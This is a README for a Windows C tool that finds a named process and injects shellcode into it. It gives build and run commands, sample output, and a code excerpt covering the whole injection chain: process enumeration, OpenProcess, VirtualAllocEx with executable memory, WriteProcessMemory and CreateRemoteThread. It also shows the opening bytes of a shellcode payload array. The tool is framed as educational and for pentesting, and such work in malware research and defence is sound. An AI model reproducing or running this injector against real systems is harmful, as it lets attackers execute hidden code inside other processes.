
# Process Scanner & Shellcode Injector

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&width=435&lines=Process+Injection+Demonstration;Windows+Remote+Process+Scanner+&+Shellcode+Injector;" alt="Typing SVG" /></a>

A robust Windows tool designed for scanning specific processes by name and injecting shellcode into them. This tool is geared towards educational purposes and malware analysis, showcasing how process injection operates within Windows environments.

**Note**: This tool is solely intended for use in controlled environments like malware research, pentesting, or debugging. Unauthorized or malicious use is strictly prohibited.

---

## Features

- Scans through all active processes in the system.
- Locates a target process using a user-defined process name.
- Injects shellcode into the target process if identified.
- Includes feedback and logging during the injection process.

---

## Prerequisites

- **Operating System**: Windows (with admin privileges)
- **Compiler**: MinGW or Visual Studio (MSVC)
- **Windows SDK**: Necessary for process enumeration and memory manipulation APIs.
- **Knowledge**: Familiarity with shellcode and process injection concepts.

---

## How It Works

The program leverages the `CreateToolhelp32Snapshot` API to create a snapshot of running processes and iterates over them, comparing each process name to the user-provided target. If a match is found, the target process is opened, memory is allocated, the shellcode is injected, and a new thread is created to execute the injected shellcode.

### Injection Workflow:

1. **Process Scanning**: Scans all running processes and identifies the target based on user-provided input.
2. **Process Opening**: Opens the identified target process using `PROCESS_ALL_ACCESS` privileges.
3. **Memory Allocation**: Allocates executable memory space in the target process.
4. **Shellcode Injection**: Injects the shellcode into the allocated memory.
5. **Remote Thread Execution**: Creates a remote thread in the target process to execute the shellcode.

---

## Usage

### Clone the repository:
```bash
git clone https://github.com/your-username/process-scanner-shellcode-injector.git
cd process-scanner-shellcode-injector
```

### Compile the Program:

#### Using MinGW (`gcc`):
```bash
gcc -o scanner_injector.exe scanner_injector.c -lkernel32 -luser32
```

#### Using Visual Studio:
- Open the provided solution in Visual Studio.
- Build the solution (Ctrl + Shift + B).

---

### Run the Program:
```bash
scanner_injector.exe <ProcessName>
```

#### Example:
```bash
scanner_injector.exe notepad.exe
```

### Example Output:
```bash
Found the process: notepad.exe with PID: 1234
Allocated 512 bytes with PAGE_EXECUTE_READWRITE permissions inside PID 1234
Injected 512 bytes of shellcode into process memory
Created a remote thread with ID 5678 in the target process
```

---

## Shellcode Example

You can modify the example shellcode (`R0m4InShell[]`) based on your test requirements. Ensure the shellcode is appropriate for controlled testing environments.

```c
unsigned char R0m4InShell[] = {
    "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
    // ... additional bytes truncated
};
```

---

## Code Breakdown

Here is a brief overview of the main parts of the process scanning and injection logic:

```c
HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
Proc.dwSize = sizeof(PROCESSENTRY32);
if (Process32First(hSnapshot, &Proc)) {
    do {
        if (wcscmp(Proc.szExeFile, target) == 0) {
            PID = Proc.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &Proc));
}

hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(R0m4InShell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, rBuffer, R0m4InShell, sizeof(R0m4InShell), NULL);
hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, &TID);
```

---

## Disclaimer

This tool is designed for educational purposes only. Unauthorized use of this tool for malicious purposes can lead to legal consequences. The developer is not responsible for any damage caused by misuse. Always ensure you have explicit permission to test and inject into a target process, especially in live environments.

---
